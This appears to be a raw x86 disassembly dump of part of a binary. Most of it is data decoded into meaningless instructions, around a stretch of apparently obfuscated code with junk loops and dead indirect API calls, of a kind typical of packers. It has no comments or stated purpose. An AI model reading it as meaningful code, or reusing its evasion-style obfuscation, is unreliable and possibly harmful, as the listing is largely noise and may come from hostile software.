  4134c8:	mov    edx,0x68546fd7
  4134cd:	and    eax,DWORD PTR ds:0x77fcdc61
  4134d3:	retf   
  4134d4:	fwait
  4134d5:	test   DWORD PTR [edx-0x67ee7ee9],0xf9632aaa
  4134df:	push   ebp
  4134e0:	mov    eax,0xaa69f5e0
  4134e5:	rol    BYTE PTR [eax-0x6c],cl
  4134e8:	popa   
  4134e9:	les    esp,FWORD PTR ds:0x18bb7d77
  4134ef:	pushf  
  4134f0:	push   ds
  4134f1:	jge    0x4134d9
  4134f3:	sub    eax,0x96d204ae
  4134f8:	inc    edx
  4134f9:	test   al,0x52
  4134fb:	push   edi
  4134fc:	pop    esp
  4134fd:	pushf  
  4134fe:	jp     0x413513
  413500:	mov    ebp,0x5cd2dd4f
  413505:	fstp   DWORD PTR [edi-0x3f]
  413508:	icebp  
  413509:	xchg   edx,eax
  41350a:	xchg   esi,eax
  41350b:	jae    0x413505
  41350d:	inc    esi
  41350e:	neg    DWORD PTR [ebp+0xe]
  413511:	iret   
  413512:	inc    ebp
  413513:	test   edi,ecx
  413515:	test   BYTE PTR [eax+0x620b6e81],bh
  41351b:	mov    edi,0x456b7296
  413520:	jo     0x41350f
  413522:	sbb    ch,BYTE PTR [edi]
  413524:	push   ebx
  413525:	jle    0x41351d
  413527:	fwait
  413528:	je     0x41359d
  41352a:	inc    BYTE PTR [edx+ebx*4+0x691b0cc8]
  413531:	sahf   
  413532:	inc    ch
  413534:	add    esi,DWORD PTR [ecx+0x2e]
  413537:	and    ch,BYTE PTR [ecx]
  413539:	cmp    BYTE PTR [ecx],dh
  41353b:	push   0x77aa0c62
  413540:	add    esp,DWORD PTR [eax+0x2f]
  413543:	jns    0x413575
  413545:	imul   bl
  413547:	fmulp  st(4),st
  413549:	sbb    al,BYTE PTR [edx]
  41354b:	into   
  41354c:	xchg   esi,eax
  41354d:	stc    
  41354e:	fild   QWORD PTR [edi+eax*8]
  413551:	sbb    BYTE PTR [eax+0x50970f3d],al
  413557:	cdq    
  413558:	mov    ds:0x6f52019c,eax
  41355d:	into   
  41355e:	gs mov dh,0xcd
  413561:	(bad)  
  413562:	mov    dl,BYTE PTR [ecx+edx*4-0x6]
  413566:	lods   al,BYTE PTR ds:[esi]
  413567:	lock pusha 
  413569:	push   es
  41356a:	jmp    0x4135a9
  41356c:	rcl    DWORD PTR [ebp-0x6e],1
  41356f:	pusha  
  413570:	rol    esi,1
  413572:	pop    edx
  413573:	shl    DWORD PTR [ecx-0x17],cl
  413576:	or     ecx,DWORD PTR [eax-0x42]
  413579:	outs   dx,DWORD PTR ds:[esi]
  41357a:	es jp  0x413532
  41357d:	mov    edi,0xca192964
  413582:	sub    BYTE PTR [eax+0x2dd41ca1],0x60
  413589:	cmp    eax,DWORD PTR [eax+0x35]
  41358c:	(bad)  
  41358d:	hlt    
  41358e:	mov    dl,0x9
  413590:	mov    dh,BYTE PTR [ebx-0x76]
  413593:	push   esp
  413594:	cs das 
  413596:	int    0x78
  413598:	je     0x41354f
  41359a:	adc    DWORD PTR [ebp+0x58],ecx
  41359d:	and    esi,DWORD PTR [ecx-0x6d]
  4135a0:	dec    ebp
  4135a1:	les    eax,FWORD PTR [edi+0x35f830b2]
  4135a7:	repnz adc ebx,DWORD PTR [eax+0x6eeb5efa]
  4135ae:	sub    esp,DWORD PTR [ebx-0x18]
  4135b1:	xor    DWORD PTR [ebx+0x12],edi
  4135b4:	xor    DWORD PTR [edx+0x148ee4b],0x6e
  4135bb:	lods   eax,DWORD PTR ds:[esi]
  4135bc:	lods   eax,DWORD PTR ds:[esi]
  4135bd:	cdq    
  4135be:	cmc    
  4135bf:	mov    eax,ds:0xdd34b2d6
  4135c4:	mov    dl,0x51
  4135c6:	sub    DWORD PTR [esi-0x72],0xed487cf2
  4135cd:	arpl   WORD PTR [edi],sp
  4135cf:	pop    eax
  4135d0:	inc    ecx
  4135d1:	sbb    esp,ebx
  4135d3:	add    BYTE PTR [eax-0x374bab53],cl
  4135d9:	xchg   ebx,eax
  4135da:	push   ebx
  4135db:	cmp    ch,bh
  4135dd:	inc    edi
  4135de:	call   0xf739:0x3128997
  4135e5:	mov    dl,0xd8
  4135e7:	jl     0x413634
  4135e9:	ret    
  4135ea:	sbb    BYTE PTR cs:[esi-0x62],bh
  4135ee:	retf   
  4135ef:	adc    eax,0xa7c07a25
  4135f4:	(bad)  
  4135f5:	loopne 0x413618
  4135f7:	fisttp WORD PTR [esi-0x686fa147]
  4135fd:	sti    
  4135fe:	sub    ebp,DWORD PTR [edx-0x5b0063a2]
  413604:	xchg   edi,eax
  413605:	and    dh,BYTE PTR [eax-0x6fdecbef]
  41360b:	shl    BYTE PTR [esi+0x33],1
  41360e:	in     eax,dx
  41360f:	call   0x6d0d:0xc2b490a9
  413616:	jne    0x4135e1
  413618:	adc    al,0xc5
  41361a:	mov    ch,0xd6
  41361c:	and    BYTE PTR [edx],0x77
  41361f:	(bad)  
  413620:	sahf   
  413621:	jmp    0xa785:0xa3e0b320
  413628:	mov    ah,0x70
  41362a:	add    BYTE PTR es:[eax+0x41f7284],0x9d
  413632:	pop    es
  413633:	ja     0x4135d7
  413635:	inc    ecx
  413636:	loope  0x4135bc
  413638:	sbb    BYTE PTR [edx-0x701f0b27],dl
  41363e:	fcomp  QWORD PTR [eax]
  413640:	dec    edx
  413641:	or     dh,ch
  413643:	inc    ebx
  413644:	push   edi
  413645:	jbe    0x4136a1
  413647:	or     al,0x25
  413649:	mov    eax,0x5e912af
  41364e:	mov    edi,0x3f340157
  413653:	sbb    dh,ch
  413655:	fadd   DWORD PTR [ebp+0x22]
  413658:	or     BYTE PTR [edx-0x2e],bl
  41365b:	leave  
  41365c:	loop   0x4136bc
  41365e:	sar    BYTE PTR [eax],cl
  413660:	fimul  DWORD PTR [ebp+0x61728c04]
  413666:	das    
  413667:	es pop eax
  413669:	pop    es
  41366a:	shl    BYTE PTR [eax-0x72],cl
  41366d:	pop    edx
  41366e:	jmp    0x5c34c157
  413673:	mov    DWORD PTR [ecx+0x3e],edx
  413676:	adc    al,0x86
  413678:	cmp    al,0x19
  41367a:	rcr    DWORD PTR [ebp+0x5c],1
  41367d:	or     eax,0xbc76b95d
  413682:	jb     0x41360c
  413684:	loopne 0x413606
  413686:	jle    0x41362e
  413688:	out    0x98,al
  41368a:	dec    eax
  41368b:	in     eax,dx
  41368c:	lods   eax,DWORD PTR ds:[esi]
  41368d:	popf   
  41368e:	sbb    edi,ebx
  413690:	mov    dh,0xb5
  413692:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413693:	jmp    0xbc75a71b
  413698:	inc    ebx
  413699:	retf   0x171c
  41369c:	das    
  41369d:	jp     0x4136b4
  41369f:	das    
  4136a0:	cmp    edi,ecx
  4136a2:	cmc    
  4136a3:	cmp    ecx,DWORD PTR [ebp-0x43de23d8]
  4136a9:	scas   al,BYTE PTR es:[edi]
  4136aa:	jl     0x413670
  4136ac:	inc    ebx
  4136ad:	repz in eax,0x70
  4136b0:	mov    ah,BYTE PTR [eax]
  4136b2:	into   
  4136b3:	inc    ecx
  4136b4:	out    dx,al
  4136b5:	into   
  4136b6:	retf   0xb7b6
  4136b9:	and    eax,0xa02a853
  4136be:	inc    edi
  4136bf:	xsaves [eax+0x21]
  4136c3:	hlt    
  4136c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4136c5:	add    eax,0x1165e498
  4136ca:	outs   dx,DWORD PTR ds:[esi]
  4136cb:	retf   
  4136cc:	rcl    DWORD PTR [esi],0xb3
  4136cf:	loopne 0x4136f7
  4136d1:	mov    fs:0xf0657657,eax
  4136d7:	add    DWORD PTR ds:0x7cfa00e5,ebx
  4136dd:	in     al,dx
  4136de:	mov    bl,0x5e
  4136e0:	xchg   ebx,eax
  4136e1:	idiv   DWORD PTR [eax]
  4136e3:	jge    0x413758
  4136e5:	or     dh,BYTE PTR [eax+eiz*2+0x21a3d439]
  4136ec:	sub    eax,ecx
  4136ee:	dec    edx
  4136ef:	push   esp
  4136f0:	fs inc ecx
  4136f2:	ficom  WORD PTR [ecx+ebx*4-0x7f7b3d37]
  4136f9:	sbb    eax,0xa332d040
  4136fe:	clc    
  4136ff:	jg     0x41374d
  413701:	test   esp,esi
  413703:	dec    esp
  413704:	and    BYTE PTR [edi+0x6],0x9e
  413708:	cmp    DWORD PTR [edx],edi
  41370a:	sub    BYTE PTR [esp+ecx*8],al
  41370d:	mov    ecx,0x1a50f7c7
  413712:	(bad)
  413715:	push   0xc44cfceb
  41371a:	shl    cl,cl
  41371c:	and    DWORD PTR [ebp-0x41],0xc1840a49
  413723:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413724:	lds    ebp,FWORD PTR gs:[ecx]
  413727:	aam    0xca
  413729:	inc    eax
  41372a:	jmp    0x6ad4ca39
  41372f:	mov    edx,0x6ea8053
  413734:	jae    0x413725
  413736:	push   ebp
  413737:	mov    db2,eax
  41373a:	add    DWORD PTR [esi-0x51],ecx
  41373d:	js     0x4136fc
  41373f:	mov    bh,0x10
  413741:	pop    ebx
  413742:	cs ret 0xdc26
  413746:	add    BYTE PTR [eax+0x1e],ah
  413749:	dec    eax
  41374a:	xchg   BYTE PTR [ecx+0x6a],ch
  41374d:	fmul   QWORD PTR [ecx+eiz*8+0x11]
  413751:	xlat   BYTE PTR ds:[ebx]
  413752:	dec    edi
  413753:	push   ss
  413754:	in     al,dx
  413755:	(bad)  
  413756:	dec    BYTE PTR [edx]
  413758:	inc    ebx
  413759:	pop    edx
  41375a:	mov    esi,0x5ec5565a
  41375f:	xor    DWORD PTR [eax-0x4645b51e],0xfffffffe
  413766:	sub    al,BYTE PTR [esi+0x21980937]
  41376c:	not    BYTE PTR [edx+0x5b3e32d1]
  413772:	dec    ebx
  413773:	fiadd  WORD PTR [edi-0x43dc2835]
  413779:	mov    al,ds:0x62c9781f
  41377e:	ss dec ebp
  413780:	push   edi
  413781:	lods   al,BYTE PTR ds:[esi]
  413782:	es adc eax,0xf1d3e2a9
  413788:	inc    eax
  413789:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41378a:	(bad)  
  41378b:	ins    DWORD PTR es:[edi],dx
  41378c:	test   DWORD PTR [edi+0x12],eax
  41378f:	mov    eax,ds:0x17cc3c3e
  413794:	mov    eax,0xd7a5f693
  413799:	push   0xe52985d3
  41379e:	cmp    BYTE PTR [ebx+0x27],ch
  4137a1:	fnstsw WORD PTR [esi-0x5210552c]
  4137a7:	jo     0x4137b0
  4137a9:	adc    eax,0xa63e9b3c
  4137ae:	adc    BYTE PTR [eax],al
  4137b0:	inc    ebp
  4137b1:	xchg   esp,eax
  4137b2:	mov    al,0x7d
  4137b4:	retf   
  4137b5:	dec    esi
  4137b6:	icebp  
  4137b7:	xchg   edx,eax
  4137b8:	sar    BYTE PTR [eax-0x538bd54c],1
  4137be:	loop   0x413756
  4137c0:	add    ebx,DWORD PTR [ebp-0x2c]
  4137c3:	mov    ebx,0x69cc31bd
  4137c8:	std    
  4137c9:	dec    ebp
  4137ca:	test   BYTE PTR [ebx-0x616ab78a],dh
  4137d0:	mov    fs,WORD PTR [esi+0x7a]
  4137d3:	les    ebx,FWORD PTR [edx+0x1a]
  4137d6:	sti    
  4137d7:	inc    esp
  4137d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137d9:	add    BYTE PTR ds:0xbcc8bc78,ah
  4137df:	(bad)  
  4137e1:	mov    ds:0x7f1c85b6,al
  4137e6:	sub    BYTE PTR [esi-0x7b],0x75
  4137ea:	not    bh
  4137ec:	xchg   esp,eax
  4137ed:	dec    eax
  4137ee:	or     edi,ebp
  4137f0:	sar    ah,0x3f
  4137f3:	dec    edi
  4137f4:	loope  0x41381f
  4137f6:	ret    0xeea2
  4137f9:	ror    BYTE PTR [esi],1
  4137fb:	rcl    DWORD PTR [ecx],1
  4137fd:	or     esi,edx
  4137ff:	rol    edx,cl
  413801:	cli    
  413802:	dec    eax
  413803:	pop    edi
  413804:	int3   
  413805:	pop    edi
  413806:	arpl   WORD PTR [ebx+0x72],si
  413809:	sti    
  41380a:	mov    dl,0xcc
  41380c:	xor    edi,edx
  41380e:	scas   al,BYTE PTR es:[edi]
  41380f:	mov    ds:0x21410278,eax
  413814:	sbb    al,0xfb
  413816:	fidivr DWORD PTR [ebx+0x5bec72df]
  41381c:	cmp    al,0xad
  41381e:	and    al,0xff
  413820:	and    BYTE PTR [ecx],al
  413822:	scas   al,BYTE PTR es:[edi]
  413823:	loop   0x413871
  413825:	(bad)  
  413826:	fcmovnu st,st(5)
  413828:	pop    eax
  413829:	pop    esp
  41382a:	push   bp
  41382c:	cld    
  41382d:	pusha  
  41382e:	inc    ecx
  41382f:	xchg   BYTE PTR [ebp-0x694579db],bh
  413835:	loop   0x4138b1
  413837:	retf   0xf84
  41383a:	out    0xe0,eax
  41383c:	lods   al,BYTE PTR ds:[esi]
  41383d:	jecxz  0x413895
  41383f:	jl     0x4137da
  413841:	clc    
  413842:	xor    DWORD PTR [edx+0x73c4dd4f],esi
  413848:	ins    DWORD PTR es:[edi],dx
  413849:	les    ebx,FWORD PTR [ebx]
  41384b:	xlat   BYTE PTR ds:[ebx]
  41384c:	lock bound edx,QWORD PTR [edx+edi*1-0x2523d53b]
  413854:	iret   
  413855:	sbb    DWORD PTR [ebp+0x5b8928ee],esp
  41385b:	adc    DWORD PTR [edx+0x2044560e],0xfa09a5f2
  413865:	sbb    DWORD PTR [edx],edi
  413867:	dec    ebp
  413868:	mov    eax,ds:0x26fca2c3
  41386d:	pop    es
  41386e:	fnstenv [edi-0x19aa64eb]
  413874:	test   DWORD PTR [ecx+0x7c],ebp
  413877:	cwde   
  413878:	sbb    BYTE PTR [ecx-0x28f54cc1],0x64
  41387f:	xor    ecx,DWORD PTR [esi-0x1a496ab0]
  413885:	pop    es
  413886:	xor    eax,0x9a43475f
  41388b:	mov    DWORD PTR [ebx],esi
  41388d:	test   al,0x61
  41388f:	mov    ah,BYTE PTR [edx-0x39]
  413892:	sub    al,0x41
  413894:	adc    eax,0xcf1bcb41
  413899:	iret   
  41389a:	ficomp DWORD PTR [eax+0x7c]
  41389d:	add    bl,cl
  41389f:	lods   eax,DWORD PTR ds:[esi]
  4138a0:	imul   edx,DWORD PTR [esi+edi*4+0x5dcc1442],0x92a570b8
  4138ab:	mov    ecx,0xafcc6341
  4138b0:	mov    cs:0x23cbb6db,al
  4138b6:	not    BYTE PTR [ebx+0x505d9492]
  4138bc:	aas    
  4138bd:	pop    edi
  4138be:	jb     0x4138da
  4138c0:	nop
  4138c1:	push   cs
  4138c2:	jns    0x413883
  4138c4:	push   eax
  4138c5:	and    BYTE PTR [ebx+0xb],dh
  4138c8:	dec    ebp
  4138c9:	cmc    
  4138ca:	mov    al,ds:0x96ab21c4
  4138cf:	enter  0xdcbc,0x9f
  4138d3:	icebp  
  4138d4:	add    DWORD PTR [esi-0x2f61d479],esp
  4138da:	adc    ah,BYTE PTR [ebx-0x53a495a5]
  4138e0:	mov    al,0x18
  4138e2:	dec    edi
  4138e3:	xor    ebx,eax
  4138e5:	and    DWORD PTR ds:0x42b01c,0x4e66
  4138ef:	sub    edx,ebx
  4138f1:	sub    edx,esi
  4138f3:	adc    DWORD PTR ds:0x42c014,0x3307
  4138fd:	xor    edx,eax
  4138ff:	add    DWORD PTR ds:0x42d004,0x3241
  413909:	mov    DWORD PTR [ebp+0x8],edx
  41390c:	or     ebx,ebx
  41390e:	mov    edx,DWORD PTR [ebp+0x8]
  413911:	mov    ebx,DWORD PTR [ebp-0x58]
  413914:	sub    DWORD PTR ds:0x429004,0x42c00c
  41391e:	add    edx,0x5708c4
  413924:	imul   edx,ebx
  413927:	mov    DWORD PTR [ebp-0x58],edx
  41392a:	mov    edx,DWORD PTR [ebp+0x8]
  41392d:	and    DWORD PTR ds:0x42d01c,0x0
  413937:	mov    ebx,DWORD PTR ds:0x42d01c
  41393d:	inc    ebx
  41393e:	mov    DWORD PTR ds:0x42d01c,ebx
  413944:	cmp    DWORD PTR ds:0x42d01c,0x29
  41394b:	jne    0x41395a
  413951:	push   DWORD PTR [ebp-0x24]
  413954:	call   DWORD PTR ds:0x42e913
  41395a:	cmp    DWORD PTR ds:0x42d01c,0x1e
  413961:	jb     0x413937
  413967:	and    DWORD PTR ds:0x42d004,0x0
  413971:	mov    ebx,DWORD PTR ds:0x42d004
  413977:	inc    ebx
  413978:	mov    DWORD PTR ds:0x42d004,ebx
  41397e:	cmp    DWORD PTR ds:0x42d004,0x7
  413985:	jne    0x4139a0
  41398b:	push   0x1baa
  413990:	push   0x42e075
  413995:	push   0x429010
  41399a:	call   DWORD PTR ds:0x42e917
  4139a0:	cmp    DWORD PTR ds:0x42d004,0x6
  4139a7:	jne    0x4139ba
  4139ad:	mov    ebx,DWORD PTR ds:0x42d004
  4139b3:	inc    ebx
  4139b4:	mov    DWORD PTR ds:0x42d004,ebx
  4139ba:	cmp    DWORD PTR ds:0x42d004,0x14
  4139c1:	jb     0x413971
  4139c7:	add    DWORD PTR ds:0x42d000,edx
  4139cd:	mov    ebx,DWORD PTR [ebp-0x54]
  4139d0:	mov    DWORD PTR ds:0x42b008,0x4ad3
  4139da:	add    edx,0x64f8da
  4139e0:	or     edx,ebx
  4139e2:	add    DWORD PTR ds:0x42c008,0x5d21
  4139ec:	mov    DWORD PTR [ebp-0x54],edx
  4139ef:	mov    edx,DWORD PTR [ebp+0x8]
  4139f2:	mov    ebx,DWORD PTR [ebp-0x50]
  4139f5:	and    DWORD PTR ds:0x42b008,0x3404
  4139ff:	add    edx,ecx
  413a01:	xor    DWORD PTR ds:0x42a000,0x42d000
  413a0b:	xor    edx,ebx
  413a0d:	mov    DWORD PTR [ebp-0x50],edx
  413a10:	add    ebx,edx
  413a12:	mov    edx,DWORD PTR [ebp+0x8]
  413a15:	adc    DWORD PTR ds:0x429008,edx
  413a1b:	mov    ebx,DWORD PTR [ebp-0x4c]
  413a1e:	or     DWORD PTR ds:0x429028,0x42d010
  413a28:	add    edx,edi
  413a2a:	or     DWORD PTR ds:0x429008,0x429010
  413a34:	and    edx,ebx
  413a36:	xor    DWORD PTR ds:0x429028,ecx
  413a3c:	mov    DWORD PTR [ebp-0x4c],edx
  413a3f:	mov    DWORD PTR ds:0x42c004,0x18
  413a49:	cmp    DWORD PTR ds:0x42c004,0x0
  413a50:	je     0x413a93
  413a56:	cmp    DWORD PTR ds:0x42c004,0x1e
  413a5d:	jne    0x413a7b
  413a63:	push   0x42a004
  413a68:	push   0x2285
  413a6d:	push   DWORD PTR [ebp-0x24]
  413a70:	push   0x1fc0
  413a75:	call   DWORD PTR ds:0x42e8cf
  413a7b:	mov    ebx,DWORD PTR ds:0x42c004
  413a81:	dec    ebx
  413a82:	mov    DWORD PTR ds:0x42c004,ebx
  413a88:	jmp    0x413a49
  413a8d:	add    DWORD PTR ds:0x42d00c,ecx
  413a93:	mov    edx,DWORD PTR [ebp+0x8]
  413a96:	sbb    ebx,DWORD PTR ds:0x42a00c
  413a9c:	mov    ebx,DWORD PTR [ebp-0x48]
  413a9f:	lea    edx,[ebx+edx*1+0x241fc1f]
  413aa6:	mov    DWORD PTR [ebp-0x48],edx
  413aa9:	inc    edx
  413aaa:	mov    edx,DWORD PTR [ebp+0x8]
  413aad:	movzx  ebx,BYTE PTR ds:0x429000
  413ab4:	sbb    DWORD PTR ds:0x42c018,ebx
  413aba:	mov    ebx,0xfa5e15e2
  413abf:	sub    ebx,edx
  413ac1:	add    ebx,DWORD PTR [ebp-0x44]
  413ac4:	and    DWORD PTR ds:0x42c018,0x0
  413ace:	jmp    0x413ae0
  413ad3:	mov    edx,DWORD PTR ds:0x42c018
  413ad9:	inc    edx
  413ada:	mov    DWORD PTR ds:0x42c018,edx
  413ae0:	cmp    DWORD PTR ds:0x42c018,0x15
  413ae7:	jae    0x413b1a
  413aed:	cmp    DWORD PTR ds:0x42c018,0x18
  413af4:	jne    0x413b0f
  413afa:	push   0x88b0
  413aff:	push   0x8c9b
  413b04:	push   0x27a5
  413b09:	call   DWORD PTR ds:0x42e8d3
  413b0f:	jmp    0x413ad3
  413b14:	or     DWORD PTR ds:0x42b004,edx
  413b1a:	mov    DWORD PTR [ebp-0x44],ebx
  413b1d:	mov    DWORD PTR ds:0x42d00c,0x11
  413b27:	cmp    DWORD PTR ds:0x42d00c,0x0
  413b2e:	je     0x413b75
  413b34:	cmp    DWORD PTR ds:0x42d00c,0x1d
  413b3b:	jne    0x413b59
  413b41:	push   0x88e0
  413b46:	push   DWORD PTR [ebp-0x18]
  413b49:	push   0x3079
  413b4e:	push   0x26f3
  413b53:	call   DWORD PTR ds:0x42e8d7
  413b59:	mov    edx,DWORD PTR ds:0x42d00c
  413b5f:	dec    edx
  413b60:	mov    DWORD PTR ds:0x42d00c,edx
  413b66:	jmp    0x413b27
  413b6b:	add    DWORD PTR ds:0x42a014,0x1458
  413b75:	mov    edx,DWORD PTR [ebp+0x8]
  413b78:	xor    DWORD PTR ds:0x429008,0x1867
  413b82:	xor    edx,eax
  413b84:	mov    DWORD PTR ds:0x42900c,0x6609
  413b8e:	add    edx,esi
  413b90:	mov    DWORD PTR ds:0x42d008,0x7de
  413b9a:	jne    0x41157e
  413ba0:	mov    DWORD PTR ds:0x42a008,0x2294
  413baa:	jmp    0x41cc2e
  413baf:	xor    edx,edx
  413bb1:	add    edx,DWORD PTR ds:0x42d014
  413bb7:	sbb    DWORD PTR ds:0x429008,edx
  413bbd:	mov    edx,DWORD PTR [ebp-0xc]
  413bc0:	mov    DWORD PTR ds:0x429010,0x17
  413bca:	cmp    DWORD PTR ds:0x429010,0x0
  413bd1:	je     0x413c04
  413bd7:	cmp    DWORD PTR ds:0x429010,0x18
  413bde:	jne    0x413bea
  413be4:	call   DWORD PTR ds:0x42e91b
  413bea:	xor    ebx,ebx
  413bec:	add    ebx,DWORD PTR ds:0x429010
  413bf2:	dec    ebx
  413bf3:	mov    DWORD PTR ds:0x429010,ebx
  413bf9:	jmp    0x413bca
  413bfe:	or     DWORD PTR ds:0x42c014,ebx
  413c04:	sub    edx,esi
  413c06:	xor    edx,eax
  413c08:	mov    ebx,DWORD PTR ds:0x41cdd0
  413c0e:	mov    ebx,DWORD PTR [ebx]
  413c10:	sub    DWORD PTR ds:0x42b018,ebx
  413c16:	mov    DWORD PTR [ebp-0x5c],edx
  413c19:	and    DWORD PTR ds:0x42b004,0x0
  413c23:	jmp    0x413c35
  413c28:	mov    ebx,DWORD PTR ds:0x42b004
  413c2e:	inc    ebx
  413c2f:	mov    DWORD PTR ds:0x42b004,ebx
  413c35:	cmp    DWORD PTR ds:0x42b004,0x1c
  413c3c:	jae    0x413c60
  413c42:	cmp    DWORD PTR ds:0x42b004,0x24
  413c49:	jne    0x413c5b
  413c4f:	push   DWORD PTR [ebp-0x1c]
  413c52:	push   DWORD PTR [ebp-0x10]
  413c55:	call   DWORD PTR ds:0x42e91f
  413c5b:	jmp    0x413c28
  413c60:	mov    edx,DWORD PTR [ebp-0x10]
  413c63:	mov    ebx,DWORD PTR [ebp-0x8]
  413c66:	xor    edx,eax
  413c68:	xor    ebx,eax
  413c6a:	sub    edx,ebx
  413c6c:	sub    edx,esi
  413c6e:	xor    edx,eax
  413c70:	mov    DWORD PTR [ebp-0x10],edx
  413c73:	mov    edx,DWORD PTR [ebp-0x14]
  413c76:	mov    DWORD PTR [ebp+0x8],edx
  413c79:	jmp    0x416037
  413c7e:	mov    edx,DWORD PTR [ebp+0x8]
  413c81:	mov    ebx,DWORD PTR [ebp-0x8]
  413c84:	xor    edx,eax
  413c86:	xor    ebx,eax
  413c88:	sub    edx,ebx
  413c8a:	sub    edx,esi
  413c8c:	xor    edx,eax
  413c8e:	mov    DWORD PTR [ebp+0x8],edx
  413c91:	mov    edx,DWORD PTR [ebp+0x8]
  413c94:	mov    ebx,DWORD PTR [ebp-0x58]
  413c97:	add    edx,0x5708c4
  413c9d:	imul   edx,ebx
  413ca0:	mov    DWORD PTR [ebp-0x58],edx
  413ca3:	mov    edx,DWORD PTR [ebp+0x8]
  413ca6:	mov    ebx,DWORD PTR [ebp-0x54]
  413ca9:	add    edx,0x64f8da
  413caf:	or     edx,ebx
  413cb1:	mov    DWORD PTR [ebp-0x54],edx
  413cb4:	mov    edx,DWORD PTR [ebp+0x8]
  413cb7:	mov    ebx,DWORD PTR [ebp-0x50]
  413cba:	add    edx,ecx
  413cbc:	jmp    0x416005
  413cc1:	xchg   ecx,eax
  413cc2:	mov    bh,BYTE PTR [edx]
  413cc4:	aad    0x3
  413cc6:	mov    ch,0x93
  413cc8:	mov    ah,al
  413cca:	xor    ebx,ecx
  413ccc:	ja     0x413cf4
  413cce:	enter  0x61b0,0x14
  413cd2:	mov    bh,BYTE PTR [esp+edi*2+0x40]
  413cd6:	pop    edi
  413cd7:	jl     0x413d55
  413cd9:	pop    ss
  413cda:	js     0x413c8d
  413cdc:	ror    DWORD PTR [ebp-0x20ec1f9],0x69
  413ce3:	scas   al,BYTE PTR es:[edi]
  413ce4:	mov    bl,0x21
  413ce6:	and    al,0xce
  413ce8:	ficom  WORD PTR [ecx-0x18]
  413ceb:	sti    
  413cec:	xchg   esp,eax
  413ced:	adc    ch,0xf2
  413cf0:	cld    
  413cf1:	adc    BYTE PTR [ebx+ecx*1-0x1da30ab4],dl
  413cf8:	imul   ebx,DWORD PTR [esi],0xffffffd1
  413cfb:	and    eax,0x62d277bf
  413d00:	mov    DWORD PTR [edx-0x5e],ecx
  413d03:	pop    ds
  413d04:	sub    edx,DWORD PTR [esi+0x79]
  413d07:	push   0x767cfef
  413d0c:	fstp   DWORD PTR [ecx+ebp*2]
  413d0f:	inc    ebp
  413d10:	mov    dl,0xd3
  413d12:	sbb    dl,dh
  413d14:	add    DWORD PTR [edi+0x3823e75e],edx
  413d1a:	inc    ebx
  413d1b:	adc    bh,BYTE PTR [esp+ebp*1+0x7d]
  413d1f:	rep outs dx,BYTE PTR ds:[esi]
  413d21:	xlat   BYTE PTR ds:[ebx]
  413d22:	push   ecx
  413d23:	xor    DWORD PTR [eax],esi
  413d25:	retf   
  413d26:	mov    edx,0xad590b6
  413d2b:	(bad)  
  413d2c:	das    
  413d2d:	outs   dx,DWORD PTR ds:[esi]
  413d2e:	mov    ebx,0x4d955140
  413d33:	xchg   ebx,eax
  413d34:	stos   DWORD PTR es:[edi],eax
  413d35:	add    eax,0x485c8b3
  413d3a:	jbe    0x413d72
  413d3c:	pop    ebx
  413d3d:	(bad)  
  413d3e:	fisttp DWORD PTR [esi]
  413d40:	or     eax,0xd0219056
  413d45:	js     0x413d60
  413d47:	or     DWORD PTR [edx+0x4374c9e8],ecx
  413d4d:	test   DWORD PTR [eax-0x6a892f27],ecx
  413d53:	mov    ecx,0xf2ec2c7c
  413d58:	mov    ecx,0x95ccfaa4
  413d5d:	dec    eax
  413d5e:	pop    ss
  413d5f:	dec    eax
  413d60:	mov    bh,0x13
  413d62:	enter  0x4d2e,0xa0
  413d66:	nop
  413d67:	out    0x7,eax
  413d69:	sub    edi,eax
  413d6b:	jae    0x413d90
  413d6d:	adc    ah,0x28
  413d70:	popa   
  413d71:	stc    
  413d72:	mov    esp,0x955d5cc8
  413d77:	retf   0x825
  413d7a:	dec    ebp
  413d7b:	add    esp,DWORD PTR [esi]
  413d7d:	lods   eax,DWORD PTR ds:[esi]
  413d7e:	setl   cl
  413d81:	pop    eax
  413d82:	sbb    DWORD PTR [ebp-0x31],0x72c66975
  413d89:	mov    dl,0x7a
  413d8b:	test   esp,0x56129702
  413d91:	aas    
  413d92:	js     0x413ddf
  413d94:	(bad)  
  413d95:	xor    esp,ebx
  413d97:	cmp    ebx,eax
  413d99:	push   es
  413d9a:	call   0x5b0d6b57
  413d9f:	jo     0x413de6
  413da1:	cmp    al,0x9c
  413da3:	and    eax,0x81dfa507
  413da8:	mov    al,0x74
  413daa:	clc    
  413dab:	test   DWORD PTR [eax],edi
  413dad:	inc    ebp
  413dae:	sti    
  413daf:	ficomp WORD PTR [edi+0x74]
  413db2:	and    edx,DWORD PTR ss:[ecx-0x1ff4b320]
  413db9:	jge    0x413e31
  413dbb:	add    eax,0x6475ecf9
  413dc0:	stc    
  413dc1:	jge    0x413d85
  413dc3:	fisttp DWORD PTR [edx+edi*4+0x4d]
  413dc7:	and    dh,BYTE PTR [esi-0x5d]
  413dca:	ds mov ebx,0xeac59d65
  413dd0:	jecxz  0x413da7
  413dd2:	sbb    ch,BYTE PTR [ecx+0x48426c4c]
  413dd8:	sub    bh,bl
  413dda:	adc    al,cl
  413ddc:	pop    esp
  413ddd:	push   ss
  413dde:	outs   dx,DWORD PTR ds:[esi]
  413ddf:	rol    DWORD PTR [eax+ebp*4-0x4cd2596d],cl
  413de6:	hlt    
  413de7:	xchg   BYTE PTR [ebp+ebp*8+0x40eeaafc],bh
  413dee:	mov    ecx,0x20e8956e
  413df3:	or     al,0x91
  413df5:	out    dx,al
  413df6:	pushf  
  413df7:	ds icebp 
  413df9:	xsha1  (bad)
  413dfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413dfb:	(bad)  
  413dfc:	cmc    
  413dfd:	push   eax
  413dfe:	das    
  413dff:	pop    ecx
  413e00:	std    
  413e01:	add    BYTE PTR fs:[edi+0x70],0xa5
  413e06:	and    eax,0x114def9d
  413e0b:	js     0x413da2
  413e0d:	jge    0x413e22
  413e0f:	jmp    0xffa3bc18
  413e14:	jge    0x413de8
  413e16:	push   edx
  413e17:	adc    al,0x68
  413e19:	adc    al,0xcc
  413e1b:	adc    BYTE PTR [edi+eax*2],0x62
  413e1f:	popf   
  413e20:	test   BYTE PTR [eax+0x641fcc5d],bh
